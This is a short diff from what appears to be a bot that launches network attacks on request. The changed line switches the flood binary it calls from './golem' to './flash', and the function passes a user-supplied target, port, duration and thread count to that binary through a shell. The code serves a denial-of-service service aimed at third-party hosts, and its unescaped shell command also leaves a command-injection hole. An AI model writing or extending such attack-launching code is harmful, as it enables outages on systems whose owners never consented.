@@ -65,7 +65,7 @@ async def attack_completed(bot, user_id, target, port, duration):
 
 def execute_attack(bot, user_id, target, port, duration):
     try:
-        full_command = f"./golem {target} {port} {duration} {SETTINGS['threads']}"
+        full_command = f"./flash {target} {port} {duration} {SETTINGS['threads']}"
         subprocess.run(full_command, shell=True)
         asyncio.run(attack_completed(bot, user_id, target, port, duration))
     except Exception as e:
